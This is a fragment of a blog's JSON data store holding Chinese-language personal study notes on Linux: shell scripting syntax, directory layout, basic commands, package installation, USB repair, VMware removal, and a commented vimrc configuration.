。Linux系统中提供了好几种不同的shell命令解释器,如sh、ash、bash等。一般默认使用bash作为默认的解释器。我们后面编写的shell脚本,都是由上述shell命令解释器解释执行的。</li>\n</ul>\n<p><img \"\" class=\"lazyload placeholder\" data-original=\"/home/blacksheep/.config/Typora/typora-user-images/image-20200607170442735.png\" src=\"https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif\" alt=\"image-20200607170442735\"></p>\n<p><img \"\" class=\"lazyload placeholder\" data-original=\"/home/blacksheep/.config/Typora/typora-user-images/image-20200607170727415.png\" src=\"https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif\" alt=\"image-20200607170727415\"></p>\n<h4 id=\"1-1-2-shell作为程序设计语言\"><a href=\"#1-1-2-shell作为程序设计语言\" class=\"headerlink\" title=\"1.1.2 shell作为程序设计语言\"></a>1.1.2 shell作为程序设计语言</h4><ul>\n<li>简称shell脚本，用任意文本编译器添加内容，再授予权限即可使用，与一些编程语言相类似</li>\n<li>/etc/profile 此文件为系统的每个用户设置环境信息,当用户第一次登录时,该文件被执行,系统的公共环境变量在这里设置 ，开始自启动的程序,一般也在这里设置</li>\n<li>~/.bashrc用户自己的家目录中的.bashrc 登录时会自动调用,打开任意终端时也会自动调用。这个文件一般设置与个人用户有关的环境变量,如交叉编译器的路径等等</li>\n<li>用户编写,需要手动调用的 例如我们上面编写的脚本都属于此类 无论是系统调用的还是需要我们自己调用的,其语法规则都一样</li>\n</ul>\n<h3 id=\"1-2-shell语法\"><a href=\"#1-2-shell语法\" class=\"headerlink\" title=\"1.2 shell语法\"></a>1.2 shell语法</h3><h4 id=\"1-2-1-脚本的定义与执行\"><a href=\"#1-2-1-脚本的定义与执行\" class=\"headerlink\" title=\"1.2.1 脚本的定义与执行\"></a>1.2.1 脚本的定义与执行</h4><ol>\n<li>定义以开头:#!/bin/sh #!用来声明脚本由什么shell解释,否则使用默认shell</li>\n<li>单个”#”号代表注释当前行</li>\n<li>执行: chmod + x test.sh ./test.sh 增加可执行权限后执行 </li>\n<li>bash test.sh 直接指定使用bash解释test.sh </li>\n<li>.  test.sh(source test.sh) 使用当前shell读取解释test.sh</li>\n<li>脚本的书写不能包含空格</li>\n</ol>\n<h4 id=\"1-2-2-变量\"><a href=\"#1-2-2-变量\" class=\"headerlink\" title=\"1.2.2 变量\"></a>1.2.2 变量</h4><ol>\n<li><p>自定义变量<br>定义变量 变量名=变量值 如:num=10 </p>\n</li>\n<li><p>引用变量 $变量名<br> 如:i=$num 把变量num的值付给变量i </p>\n</li>\n<li><p>显示变量 使用echo命令可以显示单个变量取值 echo<br> $num </p>\n</li>\n<li><p>清除变量 使用unset命令清除变量 unset varname</p>\n</li>\n<li><p>变量的其它用法: read string 从键盘输入一个字符串付给变量</p>\n</li>\n<li><p>string readonly var=100 定义一个只读变量,只能在定义时初始化,以后不能改变,不能被清除。 </p>\n</li>\n<li><p>export var=300 使用export说明的变量,会被导出为环境变量,其它shell均可使用 注意:此时必须使用source 2_var.sh才可以生效</p>\n</li>\n<li><p>注意事项:</p>\n<ol>\n<li><p>变量名只能包含英文字母下划线,不能以数字开头 1_num=10 错误 num_1=20 正确</p>\n</li>\n<li><p>等号两边不能直接接空格符,若变量中本身就包含了空格,则整个字符串都要用双引号、或单引号括起来;双引号内的特殊字符可以保有变量特性,但是单引号内的特殊字符则仅为一般字符。name=aa bb //错误 name=”aa bb” //正确 echo “$name is me” //输出:aa bb is me echo’$name is me’ //输出:$name is me 例2: 2_var.sh</p>\n</li>\n</ol>\n</li>\n</ol>\n<h4 id=\"1-2-3-环境变量（类似全局变量）\"><a href=\"#1-2-3-环境变量（类似全局变量）\" class=\"headerlink\" title=\"1.2.3 环境变量（类似全局变量）\"></a>1.2.3 环境变量（类似全局变量）</h4><ol>\n<li>shell在开始执行时就已经定义了一些和系统的工作环境有关的变量，我们可以在shell中直接使用$name引用</li>\n<li>定义：一般在~/bashrc或/etc/profile文件中（系统自动调用的脚本）使用export设置，允许用户后来修改</li>\n<li>设置环境变量：</li>\n</ol>\n<ul>\n<li>临时设置：使用export命令</li>\n<li>永久设置：需要在配置文件（~/bashrc或/etc/profile文件）中进行设置即可，设置完毕后需要通过source命令配置文件立即生效</li>\n</ul>\n<ol start=\"4\">\n<li>预设变量：</li>\n</ol>\n<pre><code>$#:传给shell脚本参数的数量 \n$*:传给shell脚本参数的内容 $1、$2、$3、...、$9:运行脚本时传递给其的参数,用空格隔开\n$?:命令执行后返回的状态 &quot;$?&quot;用于检查上一个命令执行是否正确(在Linux中,命令退出状态为0表示该命令正确执行,任何非0值表示命令出错)。\n$0:当前执行的进程名 $$:当前进程的进程号 \n&quot;$$&quot;变量最常见的用途是用作临时文件的名字以保证临时文件不会重复\n</code></pre><ol start=\"5\">\n<li>符号的特殊用法：</li>\n</ol>\n<ul>\n<li>双引号里的变量会被引用解释</li>\n<li>单引号里的字符会被直接当成字符串使用</li>\n<li>反引号：获取一个shell命令的输出结果，或者将该结果赋予一个变量再去使用，单引号的使用必须在双引号内才会被解释，不能放在单引号内</li>\n<li>转义符使用时必须在echo后面加-e</li>\n</ul>\n<pre><code>echo -e &quot;this \\n is \\n an apple&quot;</code></pre><ul>\n<li>小括号：里面的内容由子shell完成，不影响不影响当前shell中的变量</li>\n<li>大括号：在当前shell中执行会影响当前变量</li>\n</ul>\n<h4 id=\"1-2-4-条件测试语句\"><a href=\"#1-2-4-条件测试语句\" class=\"headerlink\" title=\"1.2.4 条件测试语句\"></a>1.2.4 条件测试语句</h4><ol>\n<li><p>为什么要测试？相当于代码中的局部调试</p>\n</li>\n<li><p>test命令：用于测试字符串、文件状态和数字</p>\n</li>\n<li><p>test命令的俩种形式：</p>\n<p>​            test或 [ condition ]  //方括号中的条件俩边必须要加空格</p>\n</li>\n<li></li>\n</ol>\n","site":{"data":{}},"excerpt":"<h1 id=\"Linux-高级程序设计\"><a href=\"#Linux-高级程序设计\" class=\"headerlink\" title=\"Linux 高级程序设计\"></a>Linux 高级程序设计</h1><ul>\n<li><a href=\"https://www.bilibili.com/video/BV1Mk4y1z7Tw/?p=4\">笔记参考视频链接</a></li>\n<li>注：此笔记参考了视频教程中的内容，以及部分资料，仅供学习参考</li>\n</ul>\n<h2 id=\"一、shell编程\"><a href=\"#一、shell编程\" class=\"headerlink\" title=\"一、shell编程\"></a>一、shell编程</h2><h3 id=\"1-1概述\"><a href=\"#1-1概述\" class=\"headerlink\" title=\"1.1概述\"></a>1.1概述</h3><h4 id=\"1-1-1-shell作为应用程序\"><a href=\"#1-1-1-shell作为应用程序\" class=\"headerlink\" title=\"1.1.1 shell作为应用程序\"></a>1.1.1 shell作为应用程序</h4>","more":"<ul>\n<li>交互式地解释、执行用户输入的命令,将用户的操作翻译成机器可以识别的语言,完成相应功能称之为shell命令解析器 ，shell是用户和Linux内核之间的接口程序。 用户在提示符下输入的命令都由shell先解释，然后传给Linux核心。</li>\n<li>它调用了系统核心的大部分功能来执行程序、并以并行的方式协调各个程序的运行 。Linux系统中提供了好几种不同的shell命令解释器,如sh、ash、bash等。一般默认使用bash作为默认的解释器。我们后面编写的shell脚本,都是由上述shell命令解释器解释执行的。</li>\n</ul>\n<p><img src=\"/home/blacksheep/.config/Typora/typora-user-images/image-20200607170442735.png\" alt=\"image-20200607170442735\"></p>\n<p><img src=\"/home/blacksheep/.config/Typora/typora-user-images/image-20200607170727415.png\" alt=\"image-20200607170727415\"></p>\n<h4 id=\"1-1-2-shell作为程序设计语言\"><a href=\"#1-1-2-shell作为程序设计语言\" class=\"headerlink\" title=\"1.1.2 shell作为程序设计语言\"></a>1.1.2 shell作为程序设计语言</h4><ul>\n<li>简称shell脚本，用任意文本编译器添加内容，再授予权限即可使用，与一些编程语言相类似</li>\n<li>/etc/profile 此文件为系统的每个用户设置环境信息,当用户第一次登录时,该文件被执行,系统的公共环境变量在这里设置 ，开始自启动的程序,一般也在这里设置</li>\n<li>~/.bashrc用户自己的家目录中的.bashrc 登录时会自动调用,打开任意终端时也会自动调用。这个文件一般设置与个人用户有关的环境变量,如交叉编译器的路径等等</li>\n<li>用户编写,需要手动调用的 例如我们上面编写的脚本都属于此类 无论是系统调用的还是需要我们自己调用的,其语法规则都一样</li>\n</ul>\n<h3 id=\"1-2-shell语法\"><a href=\"#1-2-shell语法\" class=\"headerlink\" title=\"1.2 shell语法\"></a>1.2 shell语法</h3><h4 id=\"1-2-1-脚本的定义与执行\"><a href=\"#1-2-1-脚本的定义与执行\" class=\"headerlink\" title=\"1.2.1 脚本的定义与执行\"></a>1.2.1 脚本的定义与执行</h4><ol>\n<li>定义以开头:#!/bin/sh #!用来声明脚本由什么shell解释,否则使用默认shell</li>\n<li>单个”#”号代表注释当前行</li>\n<li>执行: chmod + x test.sh ./test.sh 增加可执行权限后执行 </li>\n<li>bash test.sh 直接指定使用bash解释test.sh </li>\n<li>.  test.sh(source test.sh) 使用当前shell读取解释test.sh</li>\n<li>脚本的书写不能包含空格</li>\n</ol>\n<h4 id=\"1-2-2-变量\"><a href=\"#1-2-2-变量\" class=\"headerlink\" title=\"1.2.2 变量\"></a>1.2.2 变量</h4><ol>\n<li><p>自定义变量<br>定义变量 变量名=变量值 如:num=10 </p>\n</li>\n<li><p>引用变量 $变量名<br> 如:i=$num 把变量num的值付给变量i </p>\n</li>\n<li><p>显示变量 使用echo命令可以显示单个变量取值 echo<br> $num </p>\n</li>\n<li><p>清除变量 使用unset命令清除变量 unset varname</p>\n</li>\n<li><p>变量的其它用法: read string 从键盘输入一个字符串付给变量</p>\n</li>\n<li><p>string readonly var=100 定义一个只读变量,只能在定义时初始化,以后不能改变,不能被清除。 </p>\n</li>\n<li><p>export var=300 使用export说明的变量,会被导出为环境变量,其它shell均可使用 注意:此时必须使用source 2_var.sh才可以生效</p>\n</li>\n<li><p>注意事项:</p>\n<ol>\n<li><p>变量名只能包含英文字母下划线,不能以数字开头 1_num=10 错误 num_1=20 正确</p>\n</li>\n<li><p>等号两边不能直接接空格符,若变量中本身就包含了空格,则整个字符串都要用双引号、或单引号括起来;双引号内的特殊字符可以保有变量特性,但是单引号内的特殊字符则仅为一般字符。name=aa bb //错误 name=”aa bb” //正确 echo “$name is me” //输出:aa bb is me echo’$name is me’ //输出:$name is me 例2: 2_var.sh</p>\n</li>\n</ol>\n</li>\n</ol>\n<h4 id=\"1-2-3-环境变量（类似全局变量）\"><a href=\"#1-2-3-环境变量（类似全局变量）\" class=\"headerlink\" title=\"1.2.3 环境变量（类似全局变量）\"></a>1.2.3 环境变量（类似全局变量）</h4><ol>\n<li>shell在开始执行时就已经定义了一些和系统的工作环境有关的变量，我们可以在shell中直接使用$name引用</li>\n<li>定义：一般在~/bashrc或/etc/profile文件中（系统自动调用的脚本）使用export设置，允许用户后来修改</li>\n<li>设置环境变量：</li>\n</ol>\n<ul>\n<li>临时设置：使用export命令</li>\n<li>永久设置：需要在配置文件（~/bashrc或/etc/profile文件）中进行设置即可，设置完毕后需要通过source命令配置文件立即生效</li>\n</ul>\n<ol start=\"4\">\n<li>预设变量：</li>\n</ol>\n<pre><code>$#:传给shell脚本参数的数量 \n$*:传给shell脚本参数的内容 $1、$2、$3、...、$9:运行脚本时传递给其的参数,用空格隔开\n$?:命令执行后返回的状态 &quot;$?&quot;用于检查上一个命令执行是否正确(在Linux中,命令退出状态为0表示该命令正确执行,任何非0值表示命令出错)。\n$0:当前执行的进程名 $$:当前进程的进程号 \n&quot;$$&quot;变量最常见的用途是用作临时文件的名字以保证临时文件不会重复\n</code></pre><ol start=\"5\">\n<li>符号的特殊用法：</li>\n</ol>\n<ul>\n<li>双引号里的变量会被引用解释</li>\n<li>单引号里的字符会被直接当成字符串使用</li>\n<li>反引号：获取一个shell命令的输出结果，或者将该结果赋予一个变量再去使用，单引号的使用必须在双引号内才会被解释，不能放在单引号内</li>\n<li>转义符使用时必须在echo后面加-e</li>\n</ul>\n<pre><code>echo -e &quot;this \\n is \\n an apple&quot;</code></pre><ul>\n<li>小括号：里面的内容由子shell完成，不影响不影响当前shell中的变量</li>\n<li>大括号：在当前shell中执行会影响当前变量</li>\n</ul>\n<h4 id=\"1-2-4-条件测试语句\"><a href=\"#1-2-4-条件测试语句\" class=\"headerlink\" title=\"1.2.4 条件测试语句\"></a>1.2.4 条件测试语句</h4><ol>\n<li><p>为什么要测试？相当于代码中的局部调试</p>\n</li>\n<li><p>test命令：用于测试字符串、文件状态和数字</p>\n</li>\n<li><p>test命令的俩种形式：</p>\n<p>​            test或 [ condition ]  //方括号中的条件俩边必须要加空格</p>\n</li>\n<li></li>\n</ol>"},{"title":"Linux基础","date":"2020-05-03T01:08:28.000Z","comments":1,"_content":"\n[本笔记的友情链接](https://book.apeland.cn/details/189/)\n\n## 常用目录介绍\n\n1. boot    存放启动文件\n2. dev     存放设备文件\n3. etc     存放配置文件\n4. home    普通用户家目录，以/home/$username的方式存放\n5. media   移动存储自动挂载目录,以 /media/$device_name的方式来存放\n6. mnt     手动挂载目录\n7. opt     三方软件安装目录\n8. proc    内存系统文件\n9. root    管理员家目录\n10. run     里面的东西是系统运行时需要的, 不能随便删除. 但是重启的时候应该抛弃. 下次系统运行时重新生成\n11. srv     服务相关数据\n12. sys     系统文件\n13. tmp     临时文件夹\n14. usr     存放库文件、文档、命令、用户数据等\n15. var     日志存放lib     库文件\n<!--more-->\n- -echo相当于python中的print，即输出、打印的意思\n\n## linux基本命令\n### 命令[命令选项][参数]\n​    {必选项}， [可选项]\n\n1）清屏命令：clear      快捷键  ctrl+l\n2）帮助命令：man\n3）进入文件夹命令: cd  【change dir，cd理解为改变目录的意思】\n4）列出当前目录内容命令：ls   [-a -l -d ] 【list】\n5）显示主机名：hostname\n6）显示日期时间：date [-s %F]\n7）显示日历：cal\n8）计算器：bc\n9）重启命令：reboot     shutdown -r      init 6\n10）注销命令：logout\n11）关机命令：halt      shutdown -h         init 0\n12) 显示当前操作系统和机器的信息: uname\n13) 显示当前路径: pwd 【定位自己的位置】\n\n-多个命令选项可以用一个 — 拼凑在一起，若命令产生了冲突，则以排最后的为主\n-命令选项写全称时，前面加 — —\n\n\n\n- 从命令行启动图形界面的默认图片查看器\n\n  ​\t运行命令：xdg-open filename.png\n\n- 在命令行打开一个图片:\n\n   1. apt install fim\n\n   2. fim filename.png\n\n      + fim是fbi的升级版\n\n        [有关于fim的操作链接](http://www.itpro.net.cn/2019/12/linux)\n\n- apt 与apt-get 的区别：apt-get 是 apt 的子集\n\n- 更新安装包：apt upgrade\n\n\n\n### 安装内核头文件\n\n- 输入命令：apt-get install linux-headers-$(uname -r)或者直接敲apt-get install linux-headers-在这时候你按键盘上的tab键，找你本系统的头文件安装即可\n\n\n\n### 安装照相机\n\n```\nsudo apt install cheese\n```\n\n\n\n### u盘修改只读模式\n\n1. 查看U盘分区\n\n```\nsudo fdisk -l\n```\n\n2. 查看U盘的挂载点\n\n```\ndf U盘分区\n```\n\n3. 卸载原挂载的U盘\n4. 修复U盘的文件管理系统\n\n```\nsudo dosfsck -v -a [U盘分区]\n```\n\n5. 重新挂载\n\n\n\n### 蓝牙\n\n```\nsudo service bluetooth start  //打开蓝牙配适器\nsudo service bluetooth stop   //关闭蓝牙配适器\n```\n\n### 关闭进程\n\n- 有时候应用被我们1关闭了，可它还在后台运行，这就要求我们手动关闭进程\n- kill -9 进程IP    //可利用htop命令查看进程IP\n- 若没有htop，可下载\n\n```\nsudo apt install htop\n```\n\n\n\n### 卸载 IntelliJ IDEA(类似卸载可参考)\n\n1. 寻找Intellij IDEA 里面是否有uninstall.sh文件，有就能直接卸载\n2. 若没有，则在里面找说明文档，找到相关配置文件所在的目录，将IntelliJ IDEA 文件夹及其相关配置文件一起删除\n3. 可能会存在开始菜单栏里依然有图标显示的问题，\n\n```\ncd ~/.local/share/applications\n```\n\n4. 之后在applications文件夹里找到相对应的配置文件删除即可\n\n\n\n\n\n### linux换源\n\n- 进入目录  /etc/apt/\n- sudo vim source.list\n- 上网寻找适合自己的源\n\n\n\n### 关于Anaconda的安装\n\n- 在清华镜像站下载Anaconda\n\n- 安装后修改环境变量\n\n  - sudo vim /etc/profile\n\n  - 向里面写入  export PATH=$PATH:/home/balacksheep/anaconda3/bin:$PATH\n\n       \t\t\t\t\t\t%%blacksheep为用户名，应选择自己的路\t\t\t\t\t\t\t径配置环境变量\n\n- 安装后命令行使用时前面有base，代表安装成功，不需要去掉base，对使用无影响\n\n- 更换anaconda的源，以清华源举例：\n\n  - sudo vim ~/.condarc\n\n  - 向里面写入：\n\n    \n\n    ```\n    channels:\n    https://mirrors.ustc.edu.cn/anaconda/pkgs/main/\n    https://mirrors.ustc.edu.cn/anaconda/cloud/conda-forge/\n    https://mirrors.tuna.tsinghua.edu.cn/anaconda/pkgs/free/\n    defaults\n    show_channel_urls: true\n    ```\n  \n  \n\n\n### 关于qq的安装问题\n\n- 在kali系统中，输入wine，系统会自动提示你wine未安装，此时按照提示给的步骤来就行了\n- 关于字体问题：qq安装好了后会发现有些字体变成了乱码，此时可以安装一些字体来解决\n\n```\napt-get install xfonts-intl-chinese\napt-get install ttf-wqy-microhei\n```\n\n- 关于QQ用wine装好后找不到的问题\n  + wine 默认被配置成home文件下的隐藏文件，cd .wine即可调出\n  + 输入~/.wine/drive_c/Program Files (x86)/Tencent/QQ/Bin\n  + 你会发现里面优QQ.exe文件，输入wine QQ 或wine QQ.exe即可调出QQ程序\n  + 为了方便，可以把QQ/Bin 放到home文件下\n\n\n\n### 关于输入法的问题\n\n- 搜狗输入法兼容性不咋地，反正安装了很多遍都不行\n- 谷歌输入法可以用，基于小企鹅输入法使用，但是也不咋地，毕竟是外国人做的中国输入法，不怎么走心\n- 推荐使用百度输入法，基于小企鹅输入法，首先上官网搜索压缩包，解压后找到安装包文件进行安装，最重要一点是安装后关机重启，重启后系统会自动帮助你进行百度输入法的一些个性化的设置，接着到输入法设置中应用百度输入法就OK了\n\n### wps字体问题\n\n- 使用wps for linux2019 时可能有些中文字体会出现乱码，原因是系统缺失相应的字体\n- 将Windows系统下的Windows目录中的Fonts文件夹复制到Linux系统中的/usr/share/fonts/目录下，再执行以下命令\n\n```\nsudo fc-cache -fv     //识别字体库\n\nfc-list :lang=zh-cn | sort    //确认是否安装\n```\n\n\n\n\n\n### 关于vmware 虚拟机安装\n\n1. 官网下载虚拟机最新版本\n2. chmod -x 下载的文件\n3. sudo bash 下载的文件\n4. 之后就可以在电脑中找到虚拟机，并进行下一步的安装操作\n\n### linux-vmware升级问题\n\n[解决 linux升级 导致VMware启动出现\"before you can run vmware workstation, serveral modules must be complied and loaded into the runing kernel\" 而无法卸载](https://www.cnblogs.com/wjshan0808/p/4110495.html)\n\n```\n# vmware-uninstall \nYou have gotten this message because you are either downgrading VMware\nWorkstation, Player, or VIX, or because you attempted to run either\nvmware-uninstall or vmware-uninstall-vix.\n\nIf you are downgrading, please uninstall all newer versions first, then\ninstall again.\n\nThe vmware-uninstall* scripts have been deprecated.  Instead, please use\nthe vmware-installer.\n\nLong form:\n      vmware-installer --uninstall-product PRODUCT\nShort form:\n      vmware-installer -u PRODUCT\n\nWhere PRODUCT is one of vmware-workstation, vmware-player, or vmware-vix.\n\nFor a list of which products are installed, you may run:\n      vmware-installer --list-products\nor:\n      vmware-installer -l\n\n\n# vmware-installer -l\nProduct Name         Product Version     \n==================== ====================\nvmware-workstation   10.0.4.2249910      \n# vmware-installer -u vmware-workstation\n```\n\n\n\n### man 中文手册下载\n\n1. Debian / Ubuntu安装\n\n```\nsudo apt update\nsudo apt install manpages-zh\n```\n\n2. Arch Linux:\n\n```\npacman -Syu\npacman -S man-pages-zh_cn man-pages-zh_tw\n```\n\n3. Red Hat / CentOS:\n\n```\nyum update\nyum install man-pages-zh-CN\n```\n\n4. Fedora:\n\n```\ndnf update\ndnf install man-pages-zh-CN\n```\n\n\n\n### kali内核更新安装\n\n1. 查看内核版本\n\n```\nuname -r\n```\n\n2. 检查linux是否安装对应的头文件\n\n```\nsudo apt-cache search linux-headers\n```\n\n3. 安装更新头文件\n\n```\nsudo apt install linux-headers-$(uname -r)\n```\n\n4. 内核头文件检测是否安装\n\n```\nsudo dpkg-query -s linux-headers-`uname -r`\n```\n\n\n\n### vim命令\n\n1. :set number 显示行号\n2. :set 取消行号\n3. xG:跳转到指定的第x行，G移动到文件末尾行\n4. dd ：剪切一行， yy：复制一行\n5. D：剪切一个字符，y：复制一个字符\n6. p：粘贴\n7. dxw：删除光标右边x个字符\n8. dxh：删除光标左边x个字符\n9. :x 删除一个字符\n10. /string :查找字符 n:向上查找，N：向下查找\n11. :范围 s/oldword/newword/g  字符替换 %s全文查找，g为global，全局替换\n\n- vim规则总结\n\n（1）一般是操作字符+被操作的量\n\n（2）$ 为结尾， 0 为开头\n\n- vim简单配置：\n\n  \n\n  ```c\n  \"===================\n  \"适合自己用的vimrc配置文件\n  \"===================\n  \n  \"设置编码\n  set fileencodings=utf-8,ucs-bom,gb18030,gbk,gb2312,cp936\n  set termencoding=utf-8\n  set encoding=utf-8\n  \n  \"保存.vimrc文件时自动重启加载，即让此文件立即生效\n  autocmd BufWritePost $MYVIMRC source $MYVIMRC\n  \n  \"语法高亮\n  syntax on\n  \n  \"设置ruler会在右下角显示光标所在的行号和列号,不方便查看,改成设置状态栏显示内容\n  \"set ruler\n  \n  \"设置状态行显示的内容. %F: 显示当前文件的完整路径. %r: 如果readonly,会显示[RO]\n  \"%B: 显示光标下字符的编码值,十六进制. %l:光标所在的行号. %v:光标所在的虚拟列号.\n  \"%P: 显示当前内容在整个文件中的百分比. %H和%M是strftime()函数的参数,获取时间.\n  set statusline=%F%r\\ [HEX=%B][%l,%v,%P]\\ %{strftime(\\\"%H:%M\\\")}\n  \n  \"显示行号\n  set nu \"等同于 set number\n  \n  \"突出显示当前行\n  set cursorline \"等同于 set cul\n  \n  \"突出显示当前列\n  set cursorcolumn \"等同于 set cuc\n  \n  \"共享剪贴板  \n  set clipboard+=unnamed \n  \n  \"从不备份  \n  set nobackup\n  \n  \"自动保存\n  set autowrite\n  \n  \"隐藏工具栏\n  \"set guioptions-=T\n  \"隐藏菜单栏\n  \"set guioptions-=m\n  \n  \"高亮显示所有搜索到的内容.后面用map映射快捷键来方便关闭当前搜索的高亮.\n  \"set hlsearch\n  \n  \"光标立刻跳转到搜索到内容\n  \"set incsearch\n  \n  \"搜索到最后匹配的位置后,再次搜索不回到第一个匹配处\n  \"set nowrapscan\n  \n  \"去掉输入错误时的提示声音\n  set noeb\n  \n  \" 默认按下Esc后,需要等待1秒才生效,设置Esc超时时间为100ms,尽快生效\n  set ttimeout\n  set ttimeoutlen=100\n  \n  \"在处理未保存或只读文件的时候，弹出确认\n  set confirm\n  \n  \"让Backspace键可以往前删除字符.\n  \"Debian系统自带的vim版本会加载一个debian.vim文件,默认已经设置这一项,\n  \"可以正常使用Backspace键.如果使用自己编译的vim版本,并自行配置.vimrc文件,\n  \"可能就没有设置这一项,导致Backspace键用不了,或者时灵时不灵.所以主动配置.\n  \"使回格键（backspace）正常处理indent, eol, start等\n  set backspace=indent,eol,start\n  \n  \"允许backspace和光标键跨越行边界\n  \"set whichwrap+=<,>,h,l\n  \n  \"去掉有关vi一致性模式,避免操作习惯上的局限.\n  set nocompatible\n  \n  \"FIXME 在MS-DOS控制台打开vim时,控制台使用鼠标右键来复制粘贴,设置\n  \"全鼠标模式,鼠标右键被映射为visual mode,不能用来复制粘贴,不方便.\n  \"但是如果不设置鼠标模式,会无法使用鼠标滚轮来滚动界面.经过验证,发现\n  \"可以设成普通模式mouse=n来使用鼠标滚轮,也能使用鼠标右键复制粘贴.\n  \" mouse=c/mouse=i模式都不能用鼠标滚轮. Linux下还是要设成 mouse=a\n  set mouse=n\n  \"set selection=exclusive\n  \"set selectmode=mouse,key\n  \n  \"高亮显示括号匹配\n  set showmatch\n  \n  \"设置Tab长度为4空格\n  set tabstop=4\n  \"设置自动缩进长度为4空格\n  set shiftwidth=4\n  \"自动缩进,这个导致从外面拷贝多行以空格开头的内容时,会有多的缩进,先不设置\n  \"set autoindent\n  \"不要用空格代替制表符\n  set noexpandtab\n  \"输入tab制表符时，自动替换成空格\n  \"set expandtab\n  \"设置softtabstop有一个好处是可以用Backspace键来一次删除4个空格.\n  \"softtabstop的值为负数,会使用shiftwidth的值,两者保持一致,方便统一缩进.\n  \"set softtabstop=4\n  \n  \n  \"显示空格和tab键\n  set listchars=tab:>-,trail:-\n  \n  \"1=启动显示状态行, 2=总是显示状态行.设置总是显示状态行,方便看到当前文件名\n  set laststatus=2\n  \n  \"自动补全\n  :inoremap ( ()<ESC>i\n  :inoremap ) <c-r>=ClosePair(')')<CR>\n  :inoremap { {<CR>}<ESC>O\n  :inoremap } <c-r>=ClosePair('}')<CR>\n  :inoremap [ []<ESC>i\n  :inoremap ] <c-r>=ClosePair(']')<CR>\n  :inoremap \" \"\"<ESC>i\n  :inoremap ' ''<ESC>i\n  function! ClosePair(char)\n      if getline('.')[col('.') - 1] == a:char\n          return \"\\<Right>\"\n      else\n          return a:char\n      endif\n  endfunction \n  \"打开文件类型检测,并载入文件类型插件,为特定文件类型载入相关缩进文\n  filetype plugin indent on\n  \" 设置自动补全的选项. longest表示只自动补全最大匹配的部分,剩余部分通过\n  \" CTRL-P/CTRL-N来选择匹配项进行补全. menu表示弹出可补全的内容列表.\n  \" 如果有多个匹配,longest选项不会自动选中并完整补全,要多按一次CTRL-P,比较\n  \" 麻烦,不做设置,保持默认设置,vim默认没有设置longest.\n  \"set completeopt=longest,menu \"启用这句才会开启自动补全\n  \n  \n  \"=============显示中文帮助\n  if version >= 603\n      set helplang=cn\n      set encoding=utf-8\n  endif\n  \n  \"=============新建.c,.h,.sh,.java文件，自动插入文件头 \n  autocmd BufNewFile *.cpp,*.[ch],*.sh,*.java exec \":call SetTitle()\" \n  \"\"定义函数SetTitle，自动插入文件头 \n  func SetTitle() \n      \"如果文件类型为.sh文件 \n      if &filetype == 'sh' \n          call setline(1,\"\\############################\") \n          call append(line(\".\"), \"\\# File Name: \".expand(\"%\")) \n          call append(line(\".\")+1, \"\\# Author: Li Ziqiang\") \n          call append(line(\".\")+2, \"\\# mail: 2296557984@qq.com\") \n          call append(line(\".\")+3, \"\\# Created Time: \".strftime(\"%c\"))\n          call append(line(\".\")+4, \"\\############################\") \n          call append(line(\".\")+5, \"\\#!/bin/bash\") \n          call append(line(\".\")+6, \"\") \n      else \n          call setline(1, \"/******************************\") \n          call append(line(\".\"), \"    > File Name: \".expand(\"%\")) \n          call append(line(\".\")+1, \"    > Author:Li Ziqiang\") \n          call append(line(\".\")+2, \"    > Mail: 2296557984@qq.com \") \n          call append(line(\".\")+3, \"    > Created Time: \".strftime(\"%c\")) \n          call append(line(\".\")+4, \" *****************************/\") \n          call append(line(\".\")+5, \"\")\n      endif\n  \n      \"新建文件后，自动定位到文件末尾\n      autocmd BufNewFile * normal G\n  endfunc \n  \n  ```\n\n  ","source":"_posts/Linux基础.md","raw":"---\ntitle: Linux基础\ndate: 2020/5/3 9:08:28\ncomments: ture\ncategories:\n- linux\ntags:\n- Linux\n---\n\n[本笔记的友情链接](https://book.apeland.cn/details/189/)\n\n## 常用目录介绍\n\n1. boot    存放启动文件\n2. dev     存放设备文件\n3. etc     存放配置文件\n4. home    普通用户家目录，以/home/$username的方式存放\n5. media   移动存储自动挂载目录,以 /media/$device_name的方式来存放\n6. mnt     手动挂载目录\n7. opt     三方软件安装目录\n8. proc    内存系统文件\n9. root    管理员家目录\n10. run     里面的东西是系统运行时需要的, 不能随便删除. 但是重启的时候应该抛弃. 下次系统运行时重新生成\n11. srv     服务相关数据\n12. sys     系统文件\n13. tmp     临时文件夹\n14. usr     存放库文件、文档、命令、用户数据等\n15. var     日志存放lib     库文件\n<!--more-->\n- -echo相当于python中的print，即输出、打印的意思\n\n## linux基本命令\n### 命令[命令选项][参数]\n​    {必选项}， [可选项]\n\n1）清屏命令：clear      快捷键  ctrl+l\n2）帮助命令：man\n3）进入文件夹命令: cd  【change dir，cd理解为改变目录的意思】\n4）列出当前目录内容命令：ls   [-a -l -d ] 【list】\n5）显示主机名：hostname\n6）显示日期时间：date [-s %F]\n7）显示日历：cal\n8）计算器：bc\n9）重启命令：reboot     shutdown -r      init 6\n10）注销命令：logout\n11）关机命令：halt      shutdown -h         init 0\n12) 显示当前操作系统和机器的信息: uname\n13) 显示当前路径: pwd 【定位自己的位置】\n\n-多个命令选项可以用一个 — 拼凑在一起，若命令产生了冲突，则以排最后的为主\n-命令选项写全称时，前面加 — —\n\n\n\n- 从命令行启动图形界面的默认图片查看器\n\n  ​\t运行命令：xdg-open filename.png\n\n- 在命令行打开一个图片:\n\n   1. apt install fim\n\n   2. fim filename.png\n\n      + fim是fbi的升级版\n\n        [有关于fim的操作链接](http://www.itpro.net.cn/2019/12/linux)\n\n- apt 与apt-get 的区别：apt-get 是 apt 的子集\n\n- 更新安装包：apt upgrade\n\n\n\n### 安装内核头文件\n\n- 输入命令：apt-get install linux-headers-$(uname -r)或者直接敲apt-get install linux-headers-在这时候你按键盘上的tab键，找你本系统的头文件安装即可\n\n\n\n### 安装照相机\n\n```\nsudo apt install cheese\n```\n\n\n\n### u盘修改只读模式\n\n1. 查看U盘分区\n\n```\nsudo fdisk -l\n```\n\n2. 查看U盘的挂载点\n\n```\ndf U盘分区\n```\n\n3. 卸载原挂载的U盘\n4. 修复U盘的文件管理系统\n\n```\nsudo dosfsck -v -a [U盘分区]\n```\n\n5. 重新挂载\n\n\n\n### 蓝牙\n\n```\nsudo service bluetooth start  //打开蓝牙配适器\nsudo service bluetooth stop   